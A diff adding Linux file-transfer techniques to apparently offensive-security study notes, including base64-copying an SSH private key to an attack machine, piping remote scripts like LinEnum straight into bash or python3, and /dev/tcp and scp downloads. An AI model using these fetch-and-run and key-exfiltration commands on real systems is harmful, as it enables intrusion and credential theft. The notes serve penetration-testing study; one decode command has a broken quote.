@@ -86,3 +86,32 @@
 			- `echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt`
 			- `echo bye >> ftpcommand.txt`
 			- `ftp -v -n -s:ftpcommand.txt`
+# *Linux*
+- ### *Download*
+	- ##### *Base64 Encoding & Decoding*
+		- Method that doesn't require network communication, encode the file from the terminal to a Base64 string, copy its content into the terminal and perform the reverse operation.
+		- Get hash of file for comparison later using `md5sum id_rsa`.
+		- Encode the file using `cat id_rsa | base64 -w 0;echo`, copy the content and paste it into the attack machine.
+		- Decode the string using `echo -n "<base64> | base64 -d > id_rsa`.
+		- Hash the output again and compare the output with the previous file.
+	- ##### *Web Downloads with Wget and cURL*
+		- Download a file using `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`.
+		- Download a file using `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh`.
+	- ##### *Fileless Attacks*
+		- `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
+		- `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
+	- ##### *Download with bash (/dev/tcp)*
+		- Used in situations where other well-known file transfer tools aren't available.
+		- As long as bash version 2.04 or greater is present (compiled with --enable-net-redirections).
+		- **Steps**
+			- Connect to the target web server using `exec 3<>/dev/tcp/<ip>/80`.
+			- GET request using `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`.
+			- Print the response using `cat <&3`.
+	- ##### *SSH Downloads*
+		- **Configuring SSH Server**
+			- `sudo systemctl enable ssh`
+			- `sudo systemctl start ssh`
+			- Get SSH listening port using `netstat -lnpt`
+		- Download file using `scp plaintext@<server-ip>:/root/myroot.txt .`
+		- **NOTE: Create a temporary user account for file transfers and avoid using primary credentials or keys on a remote computer**
+- 
